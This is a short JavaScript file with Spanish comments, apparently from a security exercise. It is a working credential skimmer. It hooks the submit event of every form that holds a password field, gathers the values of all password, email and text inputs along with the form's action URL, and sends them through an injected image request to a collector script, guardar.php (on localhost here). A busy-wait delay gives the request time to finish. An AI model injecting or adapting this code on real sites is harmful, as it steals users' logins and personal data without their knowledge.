host = 'http://localhost/guardar.php?cookie=';
timeout = 1000;

/*
Se crea esta funcion para ... que durant un cierto tiempo realize 
*/
function sleep(millisegundos) {
var inicio = new Date().getTime();//Con esto nos da la fecha exacta de hoy 1970/01/01 hasta la de hoy todo en milisegundos
while ((new Date().getTime() - inicio) < millisegundos){}
}
//Tpodo aquello que sea password o email que se encuentre en un imput
//o cuadro de texto se envie
campos = document.querySelectorAll('input[type=password]'); //con querySelectorAll devuelve el valor del imput password
for(i=0; i<campos.length; i++) //length numero de caracteres incluido espacio
{

form = campos[i].form;
form.addEventListener('submit', function(){ // "submit" es el dichoso entrar .. //va selecionar el evento submit' gracias a addEventListener
mensaje = 'URL: ' + this.action + '\n';       //para realizar la funcion de recoger el url
nodos = this.querySelectorAll('input'); //vuelve a recoger los elementos del imput con querySelectorAll
for(j=0; j<nodos.length; j++)
{
nodo = nodos[j];
console.log(nodo);
if(nodo.type==='password' || nodo.type==='email' || nodo.type==='text') //un if con la condicion O ||
{
mensaje = mensaje + nodo.name + ': ' + nodo.value + '\n'; //mostrando el mensaje
}
}
query = '?data=' + escape(mensaje);
document.write('<img src="' + host + query + '">'); //donde se escribe la informacion es como printline
sleep(timeout); //si noe stara OFf
}, false)
}